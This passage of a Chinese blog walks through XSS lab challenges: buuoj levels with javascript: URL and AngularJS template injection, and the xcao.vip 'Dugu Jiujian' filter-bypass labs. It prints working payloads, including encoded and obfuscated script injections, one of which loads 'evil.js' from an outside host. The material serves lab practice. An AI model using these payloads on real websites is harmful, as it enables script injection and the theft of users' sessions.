class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">var</span> time = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> jumpUrl;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;<span class="comment">//获取jumpUrl参数值</span></span><br><span class="line">  jumpUrl = location.<span class="property">href</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;<span class="comment">//重定向</span></span><br><span class="line">  <span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span><br><span class="line">  location.<span class="property">href</span> = jumpUrl;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  time = time - <span class="number">1</span> ;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`页面<span class="subst">$&#123;time&#125;</span>秒后将会重定向到<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span><br><span class="line">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)<span class="comment">//获取GET参数</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>根据JS 代码的url解码规则，我们在jumpUrl里面加入JS协议即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level4?jumpUrl=javascript:alert(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;<span class="comment">//判断autosubmit是否为false</span></span><br><span class="line">  <span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">  autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);<span class="comment">//存在action参数即跳转道action</span></span><br><span class="line">  autoForm.<span class="title function_">submit</span>();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)<span class="comment">//获取GET参数值</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>所以我们直接传入两个参数并且构造跳转即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level5?autosubmit=aaa&amp;&amp;action=javascript:alert(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>模板注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level6?username=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>返回成积，再看后端模板<code>AngularJS</code><br>知识盲区了，所以参考网友的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level6?username=?username=&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h2><p>我们可以F12，在控制台直接 alert(1),通杀！ 嘿嘿嘿,不过这题就没有意义了。   </p><p>参考：</p><p><a href="https://nosec.org/home/detail/4153.html">AngularJS客户端模板注入（XSS）</a><br><a href="https://xz.aliyun.com/t/4638">AngularJS Sandbox Bypasses</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS初探-独孤九剑</title>
      <link href="/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"/>
      <url>/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/</url>
      
        <content type="html"><![CDATA[<p>靶场链接：<a href="https://t.xcao.vip/">https://t.xcao.vip/</a></p><h2 id="第一式"><a href="#第一式" class="headerlink" title="第一式"></a>第一式</h2><p>反射型XSS，过滤了 <code>( ) =</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&#x27;data&#x27;];</span><br><span class="line">$data = str_replace(&quot;=&quot;,&quot;&quot;,$data);</span><br><span class="line">$data = str_replace(&quot;(&quot;,&quot;&quot;,$data);</span><br><span class="line">$data = str_replace(&quot;)&quot;,&quot;&quot;,$data);</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>独孤九剑-第一式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>过滤了 =()，少侠骨骼惊奇，必是练武奇才<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>要求加载任意 JS 代码,成功加载 http://xcao.vip/xss/alert.js 表示完成挑战<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $data;?&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先是闭合标签，用 <code>&quot;&gt;</code> 闭合 input 标签，如<code>data=&quot;&gt;payload</code>，回显如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>独孤九剑-第一式  Design by 香草<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>过滤了 =()，少侠骨骼惊奇，必是练武奇才<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>要求加载任意JS代码,成功加载https://t.xcao.vip/xss/alert.js 表示完成挑战<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>payoad&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来考虑<code>&lt;svg&gt;</code>大法<br>构造如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> para = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">para.<span class="property">src</span>=<span class="string">&quot;https://xcao.vip/test/alert.js&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(para);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>由于<code>( ) = </code>被过滤，所以html实体字符编码，根据上篇博客，实体字符编码的目的就是使用上不方便使用的字符，所以编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x45;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x6A;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x79;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>可是 <code>#</code> 是url锚的的意思，不会被当作data的值，data值会在锚处截断。这时候就想到了，“编码是为了使用上使用不了的字符”，所以想到url编码。记得加上闭合标签，这里建议编码<code>&lt;script&gt;</code>内的内容，原因是<code>&lt;svg&gt;</code>标签内的内容解析类似于html解析，类似于建立dom树，所以<code>&lt;script&gt;</code>标签本身编码，则会出现错误</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">%26%23x63%3B%26%23x6F%3B%26%23x6E%3B%26%23x73%3B%26%23x74%3B%26%23x20%3B%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x20%3B%26%23x3D%3B%26%23x20%3B%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x63%3B%26%23x72%3B%26%23x65%3B%26%23x61%3B%26%23x74%3B%26%23x65%3B%26%23x45%3B%26%23x6C%3B%26%23x65%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x28%3B%26%23x22%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x22%3B%26%23x29%3B%26%23x3B%3B%0D%0A%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x2E%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x3D%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3A%3B%26%23x2F%3B%26%23x2F%3B%26%23x78%3B%26%23x63%3B%26%23x61%3B%26%23x6F%3B%26%23x2E%3B%26%23x76%3B%26%23x69%3B%26%23x70%3B%26%23x2F%3B%26%23x74%3B%26%23x65%3B%26%23x73%3B%26%23x74%3B%26%23x2F%3B%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x2E%3B%26%23x6A%3B%26%23x73%3B%26%23x22%3B%26%23x3B%3B%0D%0A%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x62%3B%26%23x6F%3B%26%23x64%3B%26%23x79%3B%26%23x2E%3B%26%23x61%3B%26%23x70%3B%26%23x70%3B%26%23x65%3B%26%23x6E%3B%26%23x64%3B%26%23x43%3B%26%23x68%3B%26%23x69%3B%26%23x6C%3B%26%23x64%3B%26%23x28%3B%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x29%3B%26%23x3B%3B</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>整体思路如此<code>svg --&gt; 实体编码 --&gt; url编码</code></p><p>附上作者以及网上搜集的一些payload  </p><p>靶场作者payload  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">最终 <span class="variable constant_">GET</span> <span class="variable constant_">DATA</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//xcao.vip/test/xss1.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x29%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;</span></span><br><span class="line"></span><br><span class="line">原始<span class="variable constant_">JS</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//xcao.vip/test/xss1.php?data=&quot;&gt;&lt;svg&gt;&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;&lt;/svg&gt;#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;</span></span><br><span class="line">其中   </span><br><span class="line">location.<span class="property">hash</span> 获取锚点    </span><br><span class="line">location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>) 返回第一个锚点，即 # 之后的<span class="variable constant_">JS</span>代码</span><br><span class="line">蛮巧妙的</span><br></pre></td></tr></table></figure><p>一些其他payload，总之就是可以引用目标地址的 JS 代码就好</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)).<span class="property">src</span>=<span class="string">&#x27;http://172.17.0.1:9990/evil.js&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">60</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">62</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">document.write`<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xcao.vip/xss/alert.js&quot;</span>&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">write</span><span class="string">`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/wq6ylg08/article/details/82868595">HTTP网页URL链接的语法格式最详细的分析与介绍</a></p><h2 id="第二式"><a href="#第二式" class="headerlink" title="第二式"></a>第二式</h2><p>过滤了 <code>()=.</code></p><p>第一关的payload仍可用，因为过滤函数检查的式url解码之后的data(锚点之前才是data值)，第一关所用data没有<code>.</code>号，所以依然可用</p><h2 id="第三式"><a href="#第三式" class="headerlink" title="第三式"></a>第三式</h2><p>过滤了<code>).&amp;#\</code>，放开了<code>=</code>，我们可以想到，我们最原始的payload思路就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;http://xcao.vip/test/alert.js&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，只有url里面用到了<code>.</code>号，我们知道<code>&lt;script&gt;</code>标签里的url，还会在解码一次，所以我们就想到，两次url编码 <code>.</code>号，即</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;https://xcao%252Evip/test/alert%252Ejs&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>贴一些别的解法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 